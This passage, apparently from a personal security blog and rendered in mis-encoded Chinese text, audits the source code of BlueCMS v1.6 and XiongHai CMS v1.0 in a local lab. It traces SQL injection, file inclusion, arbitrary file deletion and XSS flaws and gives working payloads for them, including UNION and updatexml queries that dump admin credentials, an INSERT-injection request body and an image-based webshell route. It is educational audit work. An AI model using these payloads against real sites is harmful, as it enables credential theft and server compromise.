å®¡è®¡ä¹‹BlueCMS_V1.6æ¼æ´ç¯å¢ƒ&amp;æ­å»ºæœ¬åœ°ç¯å¢ƒæ­å»ºï¼Œä½¿ç”¨phpstudyé›†æˆç³»ç»Ÿï¼ŒCMSç‰ˆæœ¬ä¸ºBlueCMS_v1.6 è®¿é—®installç›®å½• ä¸‹ä¸€æ­¥ï¼ŒæŸ¥çœ‹æ•°æ®åº“æ–‡ä»¶æœ‰æ²¡æœ‰ç”Ÿæˆ å®‰è£…æˆåŠŸï¼ æ¼æ´åˆ†æä¸¢è¿›seayé‡Œé¢ï¼ˆæ–°å»ºé¡¹ç›®-&gt;é€‰æ‹©bluecmså®‰è£…ç›®å½•-&gt;è‡ªåŠ¨å®¡è®¡-&gt;å¼€å§‹ï¼‰ æ•°å­—å‹SQLæ³¨å…¥äº§ç”Ÿæ­¤æ¼æ´çš„æ–‡ä»¶ä¸ºad_js.php seayæ˜¾ç¤º19è¡Œçš„$ad_idå˜é‡å­˜åœ¨sqlæ³¨å…¥ï¼Œè€Œå˜é‡$ad_idæ˜¯ä»$_GET[&#39;ad_id&#39;]ä¸­æ¥çš„,ä¸”åªç»è¿‡äº†trimã€‚ trim()ï¼šå‡½æ•°ç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ã€‚ è€Œåœ¨ad_js.phpæ–‡ä»¶çš„å¼€å¤´ï¼ˆç¬¬10è¡Œï¼‰å¼•å…¥äº†è¿‡æ»¤æ–‡ä»¶require_once dirname(__FILE__) . &#39;/include/common.inc.php&#39;; æŸ¥çœ‹common.inc.phpæ–‡ä»¶, å‘ç°å¯¹$_POST,$_GET,$_COOKIE,$_REQUESTä¼ é€’çš„å‚æ•°éƒ½è¿›è¡Œäº†è¿‡æ»¤ è·Ÿè¸ªçœ‹çœ‹deep_addslashesæ˜¯æ€ä¹ˆå®ç°çš„ 123456789101112131415function deep_addslashes($str)&#123; if(is_array($str)) &#123; foreach($str as $key=&gt;$val) &#123; $str[$key] = deep_addslashes($val); &#125; &#125; else &#123; $str = addslashes($str); // &#125; return $str;&#125; ä½¿ç”¨addslashesè¿‡æ»¤ï¼Œä½†æ˜¯addslasheså‡½æ•°æ˜¯ä¸å½±å“æ•°å­—å‹æ³¨å…¥çš„ 1$ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&#x27;ad&#x27;).&quot; WHERE ad_id =&quot;.$ad_id); å¯ä»¥çœ‹åˆ°ä¸Šé¢çš„æ˜¯ä¸ªæ•°å­—å‹æ³¨å…¥ï¼Œgetoneå‡½æ•°æˆ‘ä»¬è¿½è¸ªä¸€ä¸‹,ä»£ç åœ¨mysql.class.phpä¸­ 12345function getone($sql, $type=MYSQL_ASSOC)&#123; $query = $this-&gt;query($sql,$this-&gt;linkid); $row = mysql_fetch_array($query, $type); return $row;&#125; æ˜¯ä¸€ä¸ªæ‰§è¡Œsqlè¯­å¥çš„å‡½æ•°ï¼Œè¿™é‡Œå°±ç¡®è®¤å­˜åœ¨æ•°å­—å‹sqlæ³¨å…¥æ¼æ´ æ¼æ´å¤ç°ï¼šå› ä¸ºæˆ‘ä»¬è¿™é‡Œæ˜¯ç™½ç›’æµ‹è¯•ï¼Œæ‰€ä»¥ç›´æ¥æå–ä¸€ä¸‹ç®¡ç†çš„ç”¨æˆ·åå’Œå¯†ç  http://www.bluecms16.com/ad_js.php?ad_id=1 UNION SELECT 1,2,3,4,5,6,GROUP_CONCAT(admin_name,0x3a,pwd) FROM blue_admin 38è¡Œè¾“å‡ºçš„æ—¶å€™æ³¨é‡Šæ‰äº†ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æŸ¥çœ‹æºä»£ç  è¿˜è¦æ³¨æ„ä¸€ä¸‹0x3a-&gt;:, å› ä¸ºä¸Šé¢ä½¿ç”¨äº†addslasheså‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šå°†å•å¼•å·ï¼ˆ&#39;ï¼‰,åŒå¼•å·ï¼ˆ&quot;ï¼‰, åæ–œæ ï¼ˆ\\ï¼‰ï¼ŒNULLè¿›è¡Œè½¬ä¹‰ï¼Œè€Œä½¿ç”¨ç¼–ç å°±å¾ˆå¥½çš„ç»•è¿‡äº†ï¼ INSERTå‹SQLæ³¨å…¥ 1234567891011121314151617181920212223242526272829// include/common.fun.php æ–‡ä»¶108è¡Œfunction getip()&#123; if (getenv(&#x27;HTTP_CLIENT_IP&#x27;)) &#123; $ip = getenv(&#x27;HTTP_CLIENT_IP&#x27;); &#125; elseif (getenv(&#x27;HTTP_X_FORWARDED_FOR&#x27;)) &#123; $ip = getenv(&#x27;HTTP_X_FORWARDED_FOR&#x27;); &#125; elseif (getenv(&#x27;HTTP_X_FORWARDED&#x27;)) &#123; $ip = getenv(&#x27;HTTP_X_FORWARDED&#x27;); &#125; elseif (getenv(&#x27;HTTP_FORWARDED_FOR&#x27;)) &#123; $ip = getenv(&#x27;HTTP_FORWARDED_FOR&#x27;); &#125; elseif (getenv(&#x27;HTTP_FORWARDED&#x27;)) &#123; $ip = getenv(&#x27;HTTP_FORWARDED&#x27;); &#125; else &#123; $ip = $_SERVER[&#x27;REMOTE_ADDR&#x27;]; &#125; return $ip;&#125; ç”±äºç¬¬ä¸€åˆ†æä¸­common.inc.php,åªå¯¹$_POST,$_GET,$_COOKIE,$_REQUESTè¿›è¡Œäº†å¤„ç†ï¼Œä½†æ˜¯é—æ¼äº†$_SERVER,è€Œgetip()å‡½æ•°ä¸­æ°å¥½æ˜¯é€šè¿‡è¯¥å˜é‡è·å–ipåœ°å€ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡client-ipæˆ–x-forwarded-forè¿›è¡Œipçš„ä¼ªé€ ,è§¦å‘æ¼æ´ã€‚ phpstormä½¿ç”¨ctrl+shift+Fæœç´¢ä¸€ä¸‹ï¼Œçœ‹å“ªé‡Œè°ƒç”¨äº†getip(), å¦‚ä¸‹å›¾ï¼Œæˆ‘ä»¬è·Ÿè¿›comment.phpæ–‡ä»¶114è¡Œ 12$sql = &quot;INSERT INTO &quot;.table(&#x27;comment&#x27;).&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) VALUES (&#x27;&#x27;, &#x27;$id&#x27;, &#x27;$user_id&#x27;, &#x27;$type&#x27;, &#x27;$mood&#x27;, &#x27;$content&#x27;, &#x27;$timestamp&#x27;, &#x27;&quot;.getip().&quot;&#x27;, &#x27;$is_check&#x27;)&quot;;$db-&gt;query($sql); è¿™é‡Œæˆ‘ä»¬ä¹Ÿåˆ†æä¸€ä¸‹å…¶ä»–å˜é‡æ’å…¥ä¼šä¸ä¼šäº§ç”Ÿæ¼æ´ 12$id = !empty($_REQUEST[&#x27;id&#x27;]) ? intval($_REQUEST[&#x27;id&#x27;]) : &#x27;&#x27;;// intvalå‡½æ•°è¿›è¡Œäº†è½¬ä¹‰ 1$user_id = $_SESSION[&#x27;user_id&#x27;] ? $_SESSION[&#x27;user_id&#x27;] : 0; // ç•¥ 12$mood = intval($_POST[&#x27;mood&#x27;]);// intvalå‡½æ•°è¿›è¡Œäº†è½¬ä¹‰ 12$content = !empty($_POST[&#x27;comment&#x27;]) ? htmlspecialchars($_POST[&#x27;comment&#x27;]) : &#x27;&#x27;;// å¯¹commentå†…å®¹åšäº†htmlè½¬ä¹‰ï¼Œæ‰€ä»¥ä¸å­˜åœ¨xss çœ‹æ¥æˆ‘ä»¬è¿˜æ˜¯åªèƒ½åˆ©ç”¨getip()æ¥è§¦å‘æ¼æ´ æ¼æ´å¤ç°ï¼š è¿™é‡Œæ˜¯å¯¹è¯„è®ºåŒºè¿›è¡Œçš„sqlæ³¨å…¥ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ–°å»ºä¸€ç¯‡æ–‡ç« ï¼Œç„¶ååœ¨è¯„è®ºåŒºæµ‹è¯•ï¼ˆç™½ç›’æµ‹è¯•ï¼Œä¸ºäº†æ–¹ä¾¿ç†è§£ï¼Œæˆ‘å°†sqlè¯­å¥è¾“å‡ºäº†ï¼‰ poc æ„é€ æ€è·¯å¦‚ä¸‹: æ’å…¥ä¸¤æ¡æ•°æ®çš„æ€è·¯,è¿›è¡Œæ„é€ ï¼ˆæ³¨å…¥è¿”å›ç»“æœè¦æ˜¾ç¤ºåœ¨ç•™è¨€å†…å®¹å¤„ï¼‰ å¦ä¸€å¤„INSERTå‹æ³¨å…¥åœ¨æ–‡ä»¶guest_book.php77è¡Œå¤„ 12$sql = &quot;INSERT INTO &quot; . table(&#x27;guest_book&#x27;) . &quot; (id, rid, user_id, add_time, ip, content) VALUES (&#x27;&#x27;, &#x27;$rid&#x27;, &#x27;$user_id&#x27;, &#x27;$timestamp&#x27;, &#x27;$online_ip&#x27;, &#x27;$content&#x27;)&quot;;$db-&gt;query($sql); è¿™é‡Œæœ‰ä¸ª$online_ip, æˆ‘ä»¬è·Ÿè¸ªä¸€ä¸‹ 1234567891011121314151617181920212223242526272829// include/common.fun.phpæ–‡ä»¶106è¡Œå¤„function getip()&#123; if (getenv(&#x27;HTTP_CLIENT_IP&#x27;)) &#123; $ip = getenv(&#x27;HTTP_CLIENT_IP&#x27;); &#125; elseif (getenv(&#x27;HTTP_X_FORWARDED_FOR&#x27;)) &#123; //????????????????????????????ip ??? $ip = getenv(&#x27;HTTP_X_FORWARDED_FOR&#x27;); &#125; elseif (getenv(&#x27;HTTP_X_FORWARDED&#x27;)) &#123; $ip = getenv(&#x27;HTTP_X_FORWARDED&#x27;); &#125; elseif (getenv(&#x27;HTTP_FORWARDED_FOR&#x27;)) &#123; $ip = getenv(&#x27;HTTP_FORWARDED_FOR&#x27;); &#125; elseif (getenv(&#x27;HTTP_FORWARDED&#x27;)) &#123; $ip = getenv(&#x27;HTTP_FORWARDED&#x27;); &#125; else &#123; $ip = $_SERVER[&#x27;REMOTE_ADDR&#x27;]; &#125; return $ip;&#125; åŸç†è·Ÿä¸Šé¢çš„sqlæ³¨å…¥ä¸€æ ·ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ httpå¤´ï¼ŒåŠ ä¸ªX-FORWARDED-FOR æœ¬åœ°æ–‡ä»¶åŒ…å« æ¼æ´å‘ç”Ÿåœ¨user.phpæ–‡ä»¶750è¡Œå¤„ $_POST[&#39;pay&#39;]å¹¶æ²¡æœ‰åšå¤šä½™çš„å®‰å…¨æ£€æµ‹ï¼Œè€Œæ˜¯ç›´æ¥è¿›è¡Œæ‹¼æ¥ï¼Œä½†æ˜¯åé¢æœ‰index.phpæ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„é‡ç‚¹æ˜¯å¦‚ä½•æˆªæ–­ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„é‡ç‚¹æ˜¯å¦‚ä½•æˆªæ–­ã€‚å¦‚æœphpç‰ˆæœ¬ä½äº5.3.4ä¸”magic_quotes_gpc=offåˆ™å¯ä»¥ä½¿ç”¨%00æˆªæ–­ã€‚è¿˜å¯ä»¥ä½¿ç”¨ç³»ç»Ÿæ–‡ä»¶è·¯å¾„é•¿åº¦é™åˆ¶æ¥è¿›è¡Œæˆªæ–­ è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ç³»ç»Ÿæ–‡ä»¶è·¯å¾„é•¿åº¦é™åˆ¶æ¥æˆªæ–­ï¼š 12Windows 259ä¸ªå­—èŠ‚Linux 4096ä¸ªå­—èŠ‚ å½“ç„¶äº†ï¼Œç”±äºæ–‡ä»¶åŒ…å«æ¼æ´å¯ä»¥åŒ…å«å›¾ç‰‡æ–‡ä»¶ï¼ˆä¾‹å¦‚jpgï¼‰ï¼Œè€Œä¸”æœåŠ¡å™¨ä¼šè§£æå›¾ç‰‡æ–‡ä»¶ï¼ˆå½“ä½œphpæ–‡ä»¶æ‰§è¡Œï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä¸Šä¼ ä¸€ä¸ªå¸¦æœ¨é©¬çš„jpgæ–‡ä»¶ï¼Œç„¶ååˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´åŒ…å«æ­¤jpgæ–‡ä»¶ï¼Œæ‹¿webshell å…·ä½“åˆ©ç”¨æ­¥éª¤å¦‚ä¸‹: åœ¨ä¸ªäººèµ„æ–™ç¼–è¾‘,ä¸Šä¼ å¤´åƒå¤„ä¼ jpgæ–‡ä»¶-&gt; ä½¿ç”¨åŒ…å«æ¼æ´åŒ…å«æ­¤æ–‡ä»¶ ä»»æ„æ–‡ä»¶åˆ é™¤ æ¼æ´å‘ç”Ÿåœ¨publish.phpæ–‡ä»¶309è¡Œå¤„ 123456789elseif($act == &#x27;del_pic&#x27;)&#123; $id = $_REQUEST[&#x27;id&#x27;]; $db-&gt;query(&quot;DELETE FROM &quot;.table(&#x27;post_pic&#x27;).&quot; WHERE pic_path=&#x27;$id&#x27;&quot;); if(file_exists(BLUE_ROOT.$id)) &#123; @unlink(BLUE_ROOT.$id); &#125;&#125; ç¬¬7è¡Œunlinkåˆ é™¤æ–‡ä»¶ï¼Œä¼ å…¥$idï¼Œå…ˆåˆ é™¤æ•°æ®åº“é‡Œçš„ï¼Œç„¶ååˆ¤æ–­æœ¬åœ°æœ‰æ²¡æœ‰æ­¤æ–‡ä»¶ï¼Œå¦‚æœæœ‰ï¼Œunlinkå‡½æ•°ä¹Ÿå¯¹å…¶è¿›è¡Œåˆ é™¤ æ¼æ´å¤ç°ï¼š å¦ä¸€å¤„ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´è§¦å‘åœ¨æ–‡ä»¶user.phpä¸­788è¡Œå¤„ æœªåšä»»ä½•å¤„ç†ï¼Œç›´æ¥å¯¼è‡´ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´ æ¼æ´å¤ç°: å‘å¸ƒæ–‡ç« å¤„XSSåœ¨user.phpæ–‡ä»¶ä¸­çš„266è¡Œï¼Œæœ‰ä¸ªå¯¹æ–‡ç« å†…å®¹è¿›è¡Œè¿‡æ»¤ 1$content = !empty($_POST[&#x27;content&#x27;]) ? filter_data($_POST[&#x27;content&#x27;]) : &#x27;&#x27;; è·Ÿè¿›ä¸€ä¸‹filter_dataå‡½æ•°,çœ‹å®ƒè¿‡æ»¤äº†ä»€ä¹ˆï¼ˆinclude/common.fun.phpæ–‡ä»¶985è¡Œï¼‰ 12345function filter_data($str)&#123; $str = preg_replace(&quot;/&lt;(\\/?)(script|i?frame|meta|link)(\\s*)[^&lt;]*&gt;/&quot;, &quot;&quot;, $str); return $str;&#125; å°±è¿‡æ»¤äº†å‡ ä¸ªæ ‡ç­¾ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨imgæ ‡ç­¾ç»•è¿‡ï¼š &lt;img src=1 onerror=alert(&#39;Tao&#39;)&gt; æ¼æ´å¤ç°ï¼š ç”¨æˆ·æ³¨å†Œå¤„xssåœ¨user.phpæ–‡ä»¶ä¸­çš„763è¡Œå¤„ 1234567891011121314151617181920//ç¼–è¾‘ä¸ªäººèµ„æ–™ elseif($act == &#x27;edit_user_info&#x27;)&#123; $user_id = intval($_SESSION[&#x27;user_id&#x27;]); if(empty($user_id))&#123; return false; &#125; $birthday = trim($_POST[&#x27;birthday&#x27;]); $sex = intval($_POST[&#x27;sex&#x27;]); $email = !empty($_POST[&#x27;email&#x27;]) ? trim($_POST[&#x27;email&#x27;]) : &#x27;&#x27;; $msn = !empty($_POST[&#x27;msn&#x27;]) ? trim($_POST[&#x27;msn&#x27;]) : &#x27;&#x27;; $qq = !empty($_POST[&#x27;qq&#x27;]) ? trim($_POST[&#x27;qq&#x27;]) : &#x27;&#x27;; $mobile_phone = !empty($_POST[&#x27;mobile_phone&#x27;]) ? trim($_POST[&#x27;mobile_phone&#x27;]) : &#x27;&#x27;; $office_phone = !empty($_POST[&#x27;office_phone&#x27;]) ? trim($_POST[&#x27;office_phone&#x27;]) : &#x27;&#x27;; $home_phone = !empty($_POST[&#x27;home_phone&#x27;]) ? trim($_POST[&#x27;home_phone&#x27;]) : &#x27;&#x27;; $address = !empty($_POST[&#x27;address&#x27;]) ? htmlspecialchars($_POST[&#x27;address&#x27;]) : &#x27;&#x27;; .............. ............... $sql = &quot;UPDATE &quot;.table(&#x27;user&#x27;).&quot; SET birthday = &#x27;$birthday&#x27;, sex = &#x27;$sex&#x27;, face_pic = &#x27;$face_pic&#x27;, email = &#x27;$email&#x27;, msn = &#x27;$msn&#x27;, qq = &#x27;$qq&#x27;,&quot; .&quot; mobile_phone = &#x27;$mobile_phone&#x27;, office_phone = &#x27;$office_phone&#x27;, home_phone = &#x27;$home_phone&#x27;, address=&#x27;$address&#x27; WHERE user_id = &quot;.intval($_SESSION[&#x27;user_id&#x27;]); $db-&gt;query($sql); showmsg(&#x27;æ›´æ–°ä¸ªäººèµ„æ–™æˆåŠŸ&#x27;, &#x27;user.php&#x27;); $emailåªæ˜¯ç»è¿‡äº†trim, å…¶ä½™æœªä½œå¤„ç†ï¼Œå­˜åœ¨xss è§‚å¯Ÿè¡¨ç»“æ„ï¼Œemailé•¿åº¦æ˜¯è¶³å¤Ÿå­˜å‚¨äº§ç”Ÿxssä»£ç çš„ æ¼æ´å¤ç°ï¼š å½“ç®¡ç†ç™»å½•åå°ï¼ŒæŸ¥çœ‹ç”¨æˆ·çš„æ—¶å€™ï¼Œä¹Ÿä¼šè§¦å‘ï¼ˆå¯æ‹¿ç®¡ç†å‘˜cookieï¼‰ï¼Œè¿™é‡Œæ¨¡æ‹Ÿä¸€ä¸‹ç®¡ç†å‘˜ç™»å½•åå°ã€‚ä¸”å…·æœ‰éšè—æ€§ åå°å¤§é‡æ¼æ´æ¼æ´æœ‰ç‚¹å¤šï¼Œå°±å…ˆä¸å†™äº†ï¼Œå“ˆå“ˆå“ˆå“ˆï¼","categories":[{"name":"PHP","slug":"PHP","permalink":"https://bobtaoy.github.io/categories/PHP/"},{"name":"webå®‰å…¨","slug":"PHP/webå®‰å…¨","permalink":"https://bobtaoy.github.io/categories/PHP/web%E5%AE%89%E5%85%A8/"},{"name":"ä»£ç å®¡è®¡","slug":"PHP/webå®‰å…¨/ä»£ç å®¡è®¡","permalink":"https://bobtaoy.github.io/categories/PHP/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"PHPä»£ç å®¡è®¡","slug":"PHPä»£ç å®¡è®¡","permalink":"https://bobtaoy.github.io/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"ä»£ç å®¡è®¡ä¹‹ç†Šæµ·CMS_V1.0","slug":"ä»£ç å®¡è®¡ä¹‹ç†Šæµ·CMS-V1-0","date":"2021-02-01T13:35:01.000Z","updated":"2021-03-16T02:35:30.165Z","comments":true,"path":"2021/02/01/ä»£ç å®¡è®¡ä¹‹ç†Šæµ·CMS-V1-0/","link":"","permalink":"https://bobtaoy.github.io/2021/02/01/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E7%86%8A%E6%B5%B7CMS-V1-0/","excerpt":"","text":"æ¼æ´ç¯å¢ƒ&amp;æ­å»ºè®¿é—®installç›®å½•ï¼Œå¡«å†™ç›¸å…³é…ç½®ã€‚ æ¼æ´åˆ†æå…¥å£å¤„å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´æ¼æ´è§¦å‘æ–‡ä»¶ä¸ºindex.php,å…·ä½“ä»£ç å¦‚ä¸‹: 1234567&lt;?php//å•ä¸€å…¥å£æ¨¡å¼error_reporting(0); //å…³é—­é”™è¯¯æ˜¾ç¤º$file=addslashes($_GET[&#x27;r&#x27;]); //æ¥æ”¶æ–‡ä»¶å$action=$file==&#x27;&#x27;?&#x27;index&#x27;:$file; //åˆ¤æ–­ä¸ºç©ºæˆ–è€…ç­‰äºindexinclude(&#x27;files/&#x27;.$action.&#x27;.php&#x27;); //è½½å…¥ç›¸åº”æ–‡ä»¶?&gt; $fileå˜é‡é€šè¿‡GETè¯·æ±‚rå‚æ•°è·å–æ–‡ä»¶åï¼Œç»è¿‡äº†addslasheså‡½æ•°ã€‚ç¬¬5è¡Œé€šè¿‡ä¸‰å…ƒè¿ç®—ç¬¦åˆ¤æ–­æ–‡ä»¶æ˜¯å¦ä¸ºç©ºï¼Œä¸ºç©ºåˆ™è½½å…¥files/index.phpæ–‡ä»¶ã€‚åä¹‹èµ‹å€¼åŠ è½½files/$file.php($action=$file)ã€‚è¿™é‡Œçš„ä»£ç é€»è¾‘è™½ç„¶é™åˆ¶äº†åªèƒ½è®¿é—®filesç›®å½•ä¸‹çš„phpæ–‡ä»¶ï¼ˆå¯¹æ–‡ä»¶è¿›è¡Œäº†æ‹¼æ¥$action.&#39;.php&#39;ï¼‰ã€‚è€Œä¸”addslashesåªè½¬ä¹‰å•å¼•å·ï¼ˆ&#39;ï¼‰,åŒå¼•å·ï¼ˆ&quot;ï¼‰, åæ–œæ ï¼ˆ\\ï¼‰,NULL æ ¹æ®ä¸Šé¢çš„åˆ†æï¼Œæˆ‘ä»¬åªéœ€è¦è§£å†³ä»¥ä¸‹ä¸¤ä¸ªé—®é¢˜ï¼Œå³å¯è§¦å‘ä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´ 1.å¦‚ä½•è·³å‡ºfilesç›®å½•ï¼Ÿ 2.å¦‚ä½•æˆªæ–­æ‹¼æ¥çš„phpåç¼€ï¼Ÿ è§£å†³æ–¹æ¡ˆä¹Ÿå¾ˆç®€å•ï¼Œç¬¬ä¸€ç‚¹æˆ‘ä»¬ä½¿ç”¨../å³å¯ã€‚ç¬¬äºŒç‚¹çš„è¯åˆ©ç”¨ç³»ç»Ÿæ–‡ä»¶è·¯å¾„é•¿åº¦çš„é™åˆ¶æ¥è§£å†³ã€‚ 12Windows 259ä¸ªå­—èŠ‚Linux 4096ä¸ªå­—èŠ‚ æ¼æ´åˆ©ç”¨ï¼šåœ¨æ ¹ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªtao.txt,æ–‡ä»¶å†…å®¹ä¸º&lt;?php phpinfo();?&gt; è®¿é—®?r=../tao.txt......(ä¸ºäº†æ’ç‰ˆï¼Œè¿™é‡Œçœç•¥ä¸€æ‰‹ğŸ˜œ) UPDATEå‹SQLæ³¨å…¥æ¼æ´å‘ç”Ÿåœ¨files/content.phpæ–‡ä»¶ä¸­ ç¬¬8è¡Œä½¿ç”¨äº†addslasheså‡½æ•°å°†$idè¿›è¡Œäº†è½¬ä¹‰ï¼Œè€Œç¬¬14è¡Œçš„SQLè¯­å¥ç”¨äº†å•å¼•å·ä¿æŠ¤$navidå˜é‡ï¼Œé˜²æ­¢SQLæ³¨å…¥ï¼Œä½†æ˜¯19è¡Œå´å­˜åœ¨æ˜æ˜¾çš„UPDATEå‹æ³¨å…¥ï¼Œåˆ©ç”¨æŠ¥é”™æ‰§è¡Œsqlå‘½ä»¤ æ¼æ´åˆ©ç”¨ï¼š payload-&gt;1 or updatexml(1,concat(0x7e,(select concat(user,0x3a,password) from manage)),1) æ–‡ä»¶files/software.php13è¡Œä¹Ÿå­˜åœ¨åŒæ ·çš„é—®é¢˜ã€‚è¯­å¥éƒ½ä¸€æ ·ğŸ˜‚ ä¿®æ”¹è®¿é—®ä¸º?r=softwareã€‚åˆ©ç”¨æŠ¥é”™æ³¨å…¥ï¼Œè·Ÿä¸Šé¢ä¸€æ ·ã€‚ SQLæ³¨å…¥æ¼æ´å‘ç”Ÿåœ¨files/submit.phpæ–‡ä»¶66è¡Œå¤„ 12345678$name=$_POST[&#x27;name&#x27;];$mail=$_POST[&#x27;mail&#x27;];$url=$_POST[&#x27;url&#x27;];$content=$_POST[&#x27;content&#x27;];$cid=$_POST[&#x27;cid&#x27;];....//æŸ¥è¯¢ç”¨æˆ·å¤´åƒæ•°æ®$query = &quot;SELECT * FROM interaction WHERE( mail = &#x27;$mail&#x27;)&quot;; $mail æœªä½œä»»ä½•è¿‡æ»¤ï¼Œé—­åˆæ‹¬å·ï¼Œä½¿ç”¨æŠ¥é”™æ³¨å…¥ INSERTå‹SQLæ³¨å…¥æ¼æ´å‘ç”Ÿåœ¨files/submit.phpæ–‡ä»¶ä¸­ 1234567891011121314151617181920212223242526272829$tz=$_POST[&#x27;tz&#x27;]; // ç¬¬11è¡Œ....$query = &quot;INSERT INTO interaction ( // 121è¡Œtype,xs,cid,name,mail,url,touxiang,shebei,ip,content,tz,date) VALUES (&#x27;$type&#x27;,&#x27;$xs&#x27;,&#x27;$cid&#x27;,&#x27;$name&#x27;,&#x27;$mail&#x27;,&#x27;$url&#x27;,&#x27;$touxiang&#x27;,&#x27;$shebei&#x27;,&#x27;$ip&#x27;,&#x27;$content&#x27;,&#x27;$tz&#x27;,now())&quot;; ç”±äº11è¡Œ$tzPOSTè¯·æ±‚ä¼ è¿‡æ¥ï¼Œæœªä½œä»»ä½•å¤„ç†ã€‚ æ¼æ´åˆ©ç”¨ï¼šåˆ©ç”¨æ€è·¯è·ŸBlueCMSåˆ†æé‡Œé¢ä¸€æ ·ï¼Œæ’å…¥ä¸¤æ¡æ•°æ®(å†…å®¹å¤„æ˜¾ç¤ºå›æ˜¾ç»“æœ) 123name=Tao&amp;mail=Tao@qq.com&amp;url=http://www.baidu.com&amp;content=aaaaaæµ‹è¯•&amp;cid=1&amp;tz=888&#x27;,now()),(&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;Tao&#x27;,&#x27;Tao@qq.com&#x27;,&#x27;http://www.baidu.com&#x27;,&#x27;5&#x27;,&#x27;PC&#x27;,&#x27;127.0.0.1&#x27;,(select/*Tao*/user()),&#x27;Tao ä¸¤ä¸ªSQLæ³¨å…¥123456789101112131415$type=addslashes($_GET[&#x27;type&#x27;]);$cid=$_POST[&#x27;cid&#x27;]; if ($type==&#x27;comment&#x27;)&#123; //75è¡Œ$fhlink=&quot;/?r=content&amp;cid=&quot;.$cid;$fhname=&quot;è¯„è®º&quot;;$type=1;&#125;if ($pltz==1)&#123;.... if ($type==1)&#123; $query = &quot;SELECT * FROM content WHERE( id= $cid)&quot;; // SQLæ³¨å…¥ $result = mysql_query($query) or die(&#x27;SQLè¯­å¥æœ‰è¯¯ï¼š&#x27;.mysql_error()); $wz = mysql_fetch_array($result); $title=$wz[&#x27;title&#x27;];&#125; è¿™é‡Œæƒ³è¦åˆ©ç”¨SQLæ³¨å…¥ï¼Œé¦–å…ˆéœ€è¦ä½¿å¾—$pltz==1, ç„¶åä½¿$type==1, è€Œéœ€è¦ä½¿$type=1çš„æ¡ä»¶å°±æ˜¯$type==&#39;comment&#39;ã€‚è€Œè¿™ä¸ªæˆ‘ä»¬æ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œæ‰€ä»¥äº§ç”Ÿäº†æ­¤æ¼æ´ 123456789101112if ($type==&#x27;download&#x27;)&#123; // 86è¡Œ $fhlink=&quot;/?r=software&amp;cid=&quot;.$cid; $fhname=&quot;è½¯ä»¶è¯„è®º&quot;; $type=3;&#125;........if ($type==3)&#123;$query = &quot;SELECT * FROM download WHERE( id= $cid)&quot;; // SQLæ³¨å…¥$result = mysql_query($query) or die(&#x27;SQLè¯­å¥æœ‰è¯¯ï¼š&#x27;.mysql_error());$wz = mysql_fetch_array($result);$title=$wz[&#x27;title&#x27;]; ä»¥ä¸Šä¸¤ä¸ªSQLæ³¨å…¥æ¼æ´ç‚¹ï¼Œäº§ç”ŸåŸå› ä¸€æ ·ã€‚ä½†æ˜¯æœ‰ç‚¹é¸¡åŠ©ï¼Œå› ä¸ºä½¿$pltz ==1éœ€è¦å¼€å¯æ–°è¯„è®º/ç•™è¨€é€šçŸ¥ç«™é•¿åŠŸèƒ½ã€‚ 1234567891011121314//æŸ¥è¯¢ç³»ç»Ÿé«˜çº§è®¾ç½®$query = &quot;SELECT * FROM seniorset&quot;;$result = mysql_query($query) or die(&#x27;SQLè¯­å¥æœ‰è¯¯ï¼š&#x27;.mysql_error());$advanced = mysql_fetch_array($result);$lysh=$advanced [&#x27;lysh&#x27;];//ç•™è¨€å®¡æ ¸$plsh=$advanced [&#x27;plsh&#x27;];//è¯„è®ºå®¡æ ¸$pltz=$advanced [&#x27;pltz&#x27;];//æ–°ç•™è¨€è¯„è®ºé€šçŸ¥if ($pltz==1)&#123;...... if ($type==1)&#123; $query = &quot;SELECT * FROM content WHERE( id= $cid)&quot;; // SQLæ³¨å…¥ .... if ($type==3)&#123; $query = &quot;SELECT * FROM download WHERE( id= $cid)&quot;; // SQLæ³¨å…¥ éœ€è¦ä½¿$pltz ==1ï¼Œæ‰ä¼šè¿›å…¥if ($type==1)ã€‚ç„¶åæ‰§è¡Œsqlè¯­å¥ï¼Œè€Œ$pltzæ˜¯ä»seniorsetè¡¨ä¸­æ¥çš„ï¼ˆå¼€å¯æ–°è¯„è®º/ç•™è¨€é€šçŸ¥ç«™é•¿åŠŸèƒ½ï¼‰ã€‚ ä¸ºäº†æ–¹ä¾¿ç†è§£ï¼Œç®€æ´çš„æ•´ç†äº†ä¸€ä¸‹æ‰§è¡Œçš„æµç¨‹ï¼š 12345678910111213141516171819202122$cid=$_POST[&#x27;cid&#x27;];//æŸ¥è¯¢ç³»ç»Ÿé«˜çº§è®¾ç½®$query = &quot;SELECT * FROM seniorset&quot;;$result = mysql_query($query) or die(&#x27;SQLè¯­å¥æœ‰è¯¯ï¼š&#x27;.mysql_error());$advanced = mysql_fetch_array($result);$lysh=$advanced [&#x27;lysh&#x27;];//ç•™è¨€å®¡æ ¸$plsh=$advanced [&#x27;plsh&#x27;];//è¯„è®ºå®¡æ ¸$pltz=$advanced 